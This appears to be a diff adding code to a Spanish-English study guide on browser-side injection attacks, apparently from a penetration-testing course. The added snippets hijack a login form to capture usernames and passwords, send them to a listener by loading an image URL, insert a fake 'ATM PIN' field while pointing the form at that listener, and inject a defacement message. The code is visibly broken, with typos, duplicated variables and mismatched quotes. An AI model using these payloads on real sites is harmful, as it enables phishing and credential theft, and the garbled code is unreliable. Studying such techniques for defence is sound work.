@@ -20,8 +20,55 @@ for  (i=0; i<links.length; i++){
 ```
 
 ### 3. Hijack form submit
+```
+function InterceptForm(){
+  var username = document.forms[0].elements[0].value;
+  var username = document.forms[0].elements[1].value;
+  alert(username + ' : ' + password);
+}
+document.forms[0].onsubmit = InterceptForm;
+```
+
+```
+> python -m SimpleHTTPServer 8000
+function InterceptForm(){
+  var username = document.forms[0].elements[0].value;
+  var username = document.forms[0].elements[1].value;
+  new Image().src = "http://localhost:8000/?username=' + username + "&password=" + password;
+}
+document.forms[0].onsubmit = InterceptForm;
+```
+
 ### 4. Modify form fields
+```
+var input = document.createElement("input");
+
+input.setAttribute("type", "text");
+input.setAttribute("class", "input-block-level");
+input.setAttribute("placeholder", "ATM PIN");
+input.setAttribute("name", "atmpin");
+
+var provius = document.forms[0].elements[0];
+
+document.forms[0].insertBefore(input, previous);
+docuemnt.forms[0].action = "http://localhost:8000/"
+```
+
 ### 5. Ingenieria social
+```
+var input = document.createElement("h2");
+input.innerHTML = "Sitio web subido. Por favor visita pentesteracademy.com";
+document.forms[0].parentNode.appendChild(input)
+```
+
+```
+var input = document.createElement("h2");
+input.innerHTML = "Sitio web subido. Por favor visita pentesteracademy.com";
+document.forms[0].parentNode.appendChild(input)
+document.forms[0].parentNode.appendChild(document.forms[0)
+```
+
+
 ### 6. Capture all clicks
 ### 7. Keystroke logging
 ### 8. Event listener
